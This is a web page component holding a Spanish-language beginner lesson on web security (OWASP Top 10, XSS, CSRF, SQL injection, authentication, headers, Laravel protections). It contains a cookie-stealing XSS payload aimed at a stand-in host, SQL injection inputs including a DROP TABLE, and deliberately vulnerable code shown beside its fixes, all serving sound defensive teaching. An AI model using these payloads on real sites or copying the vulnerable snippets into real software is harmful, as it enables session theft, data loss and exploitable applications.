import LessonLayout from '@/layouts/LessonLayout';
import { Head, Link } from '@inertiajs/react';

const modules = [
    { id: '/lecciones/seguridad-web', title: 'OWASP Top 10 en 2025', free: true },
    { id: '/lecciones/seguridad-web#xss', title: 'XSS y CSRF', free: true },
    { id: '/lecciones/seguridad-web#sql', title: 'SQL Injection', free: true },
    { id: '/lecciones/seguridad-web#auth', title: 'Autenticación segura', free: true },
    { id: '/lecciones/seguridad-web#headers', title: 'HTTP Security Headers', free: true },
    { id: '/lecciones/seguridad-web#laravel', title: 'Seguridad en Laravel', free: true },
];

export default function SeguridadWeb() {
    return (
        <LessonLayout
            title="Seguridad básica en la web"
            description="Entiende las vulnerabilidades más comunes y cómo proteger tus aplicaciones desde el principio."
            duration="2h 10min"
            lessons={10}
            level="Básico"
            premium={false}
            modules={modules}
            activeModule="/lecciones/seguridad-web"
            prevHref="/lecciones/laravel"
            category="Seguridad"
        >
            <Head>
                <title>Seguridad básica en la web — Aprende a Programar</title>
                <meta name="description" content="Aprende a proteger tus aplicaciones web: OWASP Top 10, XSS, SQL Injection, CSRF, headers de seguridad. Gratis y actualizado 2026." />
            </Head>

            <h1>Seguridad básica en la web</h1>

            <blockquote>
                En 2025, el coste medio de una brecha de datos fue de <strong>4.88 millones de dólares</strong> (IBM Cost of a Data Breach 2025). La mayoría de los ataques explotan vulnerabilidades conocidas y evitables. Conocerlas es el primer paso para no sufrirlas.
            </blockquote>

            <h2 id="owasp">OWASP Top 10 (actualización 2025)</h2>
            <p>
                OWASP (Open Web Application Security Project) mantiene la lista de las 10 vulnerabilidades más críticas. La edición 2025 mantiene las categorías principales con algunas actualizaciones relevantes:
            </p>

            <ol>
                <li><strong>Broken Access Control</strong> — El más común. Usuarios acceden a recursos para los que no tienen permiso.</li>
                <li><strong>Cryptographic Failures</strong> — Datos sensibles expuestos por mala criptografía o transmisión en claro.</li>
                <li><strong>Injection</strong> — SQL, OS, LDAP injection. El código malicioso se inyecta como datos.</li>
                <li><strong>Insecure Design</strong> — Fallos de arquitectura que no pueden parchearse sin rediseñar.</li>
                <li><strong>Security Misconfiguration</strong> — Configuraciones por defecto inseguras, puertos abiertos, headers faltantes.</li>
                <li><strong>Vulnerable Components</strong> — Dependencias con vulnerabilidades conocidas (npm audit, composer audit).</li>
                <li><strong>Authentication Failures</strong> — Contraseñas débiles, sesiones mal gestionadas, sin 2FA.</li>
                <li><strong>Software Integrity Failures</strong> — Ataques a la cadena de suministro (supply chain).</li>
                <li><strong>Logging &amp; Monitoring Failures</strong> — Sin logs, los ataques pasan desapercibidos.</li>
                <li><strong>Server-Side Request Forgery (SSRF)</strong> — El servidor realiza peticiones a recursos internos.</li>
            </ol>

            <h2 id="xss">XSS — Cross-Site Scripting</h2>
            <p>
                XSS permite a un atacante inyectar JavaScript malicioso en páginas vistas por otros usuarios. Puede usarse para robar cookies de sesión, redirigir a phishing o tomar el control del navegador.
            </p>

            <h3>Tipos de XSS</h3>
            <ul>
                <li><strong>Reflected</strong> — El payload llega en la URL y se refleja en la respuesta</li>
                <li><strong>Stored</strong> — El payload se guarda en la BD y afecta a todos los usuarios que lo ven</li>
                <li><strong>DOM-based</strong> — El payload se ejecuta manipulando el DOM sin pasar por el servidor</li>
            </ul>

            <h3>Ejemplo de vulnerabilidad</h3>
            <pre><code>{`<!-- ❌ VULNERABLE: renderiza HTML sin escapar -->
<p><?= $_GET['nombre'] ?></p>

<!-- Ataque: ?nombre=<script>document.location='https://evil.com/steal?c='+document.cookie</script> -->`}</code></pre>

            <h3>Solución</h3>
            <pre><code>{`<!-- ✅ PHP: usar htmlspecialchars -->
<p><?= htmlspecialchars($_GET['nombre'], ENT_QUOTES, 'UTF-8') ?></p>

<!-- ✅ Blade (Laravel): escape automático con {{ }} -->
<p>{{ $nombre }}</p>     {{-- Escapado automático --}}
<p>{!! $html !!}</p>     {{-- ⚠️ Sin escape, solo para HTML de confianza --}}

// ✅ React: JSX escapa automáticamente
<p>{nombre}</p>          // Seguro
<div dangerouslySetInnerHTML={{ __html: html }} />  // ⚠️ Peligroso`}</code></pre>

            <h3>Content Security Policy (CSP)</h3>
            <pre><code>{`# Añadir en el servidor web o como header HTTP
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; style-src 'self' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`}</code></pre>

            <h2>CSRF — Cross-Site Request Forgery</h2>
            <p>
                CSRF engaña al navegador de un usuario autenticado para que realice acciones no deseadas en tu aplicación. Si el usuario está logado en tu banco, un sitio malicioso podría hacer que su navegador envíe una transferencia.
            </p>

            <pre><code>{`<!-- ❌ VULNERABLE: formulario sin token CSRF -->
<form action="/transferir" method="POST">
    <input name="cantidad" value="1000">
    <button type="submit">Transferir</button>
</form>

<!-- ✅ Laravel: @csrf añade el token automáticamente -->
<form action="/transferir" method="POST">
    @csrf
    <input name="cantidad" value="1000">
    <button type="submit">Transferir</button>
</form>`}</code></pre>

            <pre><code>{`// En JavaScript / fetch
fetch('/api/datos', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
    },
    body: JSON.stringify({ key: 'value' }),
});

// Laravel 13: PreventRequestForgery también verifica el origen (nuevo)
// Protección doble: token + cabecera Origin`}</code></pre>

            <h2 id="sql">SQL Injection</h2>
            <p>
                Una de las vulnerabilidades más antiguas y todavía una de las más explotadas. Permite a un atacante manipular las consultas SQL de tu aplicación para leer, modificar o eliminar datos.
            </p>

            <pre><code>{`// ❌ VULNERABLE: concatenar datos del usuario en SQL
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
// Ataque: ?id=1 OR 1=1 -- → devuelve TODOS los usuarios
// Ataque: ?id=1; DROP TABLE users --

// ✅ CORRECTO: Prepared statements (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// ✅ CORRECTO: Eloquent (usa prepared statements automáticamente)
$user = User::find($request->id);
$user = User::where('email', $request->email)->first();

// ✅ CORRECTO: Query builder de Laravel
$users = DB::table('users')
            ->where('email', $request->email)
            ->where('active', true)
            ->get();

// ❌ NUNCA uses DB::statement con datos del usuario sin escapar
DB::statement("SELECT * FROM users WHERE name = '$name'"); // Peligroso`}</code></pre>

            <h2 id="auth">Autenticación segura</h2>

            <h3>Contraseñas</h3>
            <pre><code>{`// ✅ Nunca almacenar contraseñas en texto plano

// PHP: usar password_hash con bcrypt o argon2id
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,  // 64MB
    'time_cost'   => 4,      // 4 iteraciones
    'threads'     => 3,
]);
$valid = password_verify($password, $hash);

// Laravel: usa bcrypt por defecto, argon2id disponible
// config/hashing.php → 'driver' => 'argon2id'

// En el modelo User:
protected function password(): Attribute
{
    return Attribute::make(
        set: fn($value) => Hash::make($value),
    );
}`}</code></pre>

            <h3>Tokens y sesiones</h3>
            <pre><code>{`// ✅ Regenerar ID de sesión tras login (evita session fixation)
Session::regenerate();     // Laravel lo hace automáticamente en Auth::login()

// ✅ HttpOnly + Secure + SameSite en cookies
// config/session.php en Laravel 13:
'http_only' => true,       // JavaScript no puede leer la cookie
'secure'    => true,       // Solo HTTPS
'same_site' => 'lax',      // Protección CSRF adicional

// ✅ Timeout de sesión
'lifetime' => 120,         // 2 horas de inactividad

// ✅ Rate limiting en login (brute force protection)
// Laravel 13 incluye ThrottleRequests middleware
Route::middleware('throttle:5,1')->group(function () {
    Route::post('/login', [AuthController::class, 'store']);
});`}</code></pre>

            <h3>Dos factores (2FA)</h3>
            <pre><code>{`# Laravel Fortify incluye 2FA con TOTP (Google Authenticator, Authy)
composer require laravel/fortify
php artisan vendor:publish --provider="Laravel\Fortify\FortifyServiceProvider"

# Activar en config/fortify.php:
'features' => [
    Features::twoFactorAuthentication([
        'confirm' => true,
        'confirmPassword' => true,
    ]),
],`}</code></pre>

            <h2 id="headers">HTTP Security Headers</h2>
            <p>Los headers de seguridad son la primera línea de defensa del navegador. Añádelos siempre en producción.</p>

            <pre><code>{`# En Nginx
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'; ..." always;`}</code></pre>

            <pre><code>{`// En Laravel: middleware personalizado
class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=()');
        if ($request->secure()) {
            $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        }
        return $response;
    }
}`}</code></pre>

            <h2 id="laravel">Seguridad específica en Laravel 13</h2>

            <h3>Validación de entrada</h3>
            <pre><code>{`// ✅ SIEMPRE validar en el servidor
$validated = $request->validate([
    'email'    => 'required|email|max:255',
    'password' => 'required|string|min:8|confirmed',
    'age'      => 'required|integer|min:18|max:120',
    'file'     => 'required|file|mimes:pdf,jpg,png|max:2048',  // 2MB máx
    'url'      => 'required|url|active_url',
]);

// Form Requests para validaciones complejas
php artisan make:request StoreUserRequest`}</code></pre>

            <h3>Mass Assignment</h3>
            <pre><code>{`// ❌ VULNERABLE: actualizar cualquier campo del modelo
$user->update($request->all());

// ✅ CORRECTO: solo los campos permitidos
class User extends Model
{
    protected $fillable = ['name', 'email'];  // Solo estos
    // O alternativamente:
    protected $guarded = ['role', 'is_admin']; // Estos NO
}

// ✅ CORRECTO: validar antes de asignar
$user->update($request->only(['name', 'email']));`}</code></pre>

            <h3>Subida de archivos</h3>
            <pre><code>{`// ❌ VULNERABLE: confiar en el nombre/tipo del cliente
$file = $request->file('upload');
$file->move(public_path(), $file->getClientOriginalName());

// ✅ CORRECTO
$path = $request->file('upload')
    ->storeAs(
        'uploads',
        Str::uuid() . '.' . $file->extension(),  // Nombre aleatorio
        'private'                                  // Fuera del public/
    );

// Validar tipo real (no solo extensión)
$request->validate([
    'upload' => 'file|mimes:pdf,jpg,png|max:5120',
]);`}</code></pre>

            <h2>Herramientas de auditoría</h2>
            <ul>
                <li><strong>composer audit</strong> — detecta vulnerabilidades en dependencias PHP</li>
                <li><strong>npm audit</strong> — lo mismo para JavaScript</li>
                <li><strong>OWASP ZAP</strong> — escáner de seguridad web gratuito</li>
                <li><strong>Nikto</strong> — escáner de servidores web</li>
                <li><strong>securityheaders.com</strong> — analiza tus headers desde el navegador</li>
                <li><strong>Have I Been Pwned</strong> — verifica si emails/contraseñas están comprometidos</li>
            </ul>

            <blockquote>
                La seguridad no es un estado, es un proceso continuo. Mantén tus dependencias actualizadas, monitoriza los logs y haz auditorías periódicas. Un sistema seguro hoy puede ser vulnerable mañana si no se mantiene.
            </blockquote>

            <h2>Próximos pasos</h2>
            <p>
                Con estas bases puedes proteger la mayoría de las aplicaciones web estándar. Para profundizar, practica con el <Link href="/juegos/quiz-seguridad">test de seguridad web</Link> y estudia la guía <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>, la referencia del sector sobre los riesgos más importantes en aplicaciones web.
            </p>
        </LessonLayout>
    );
}
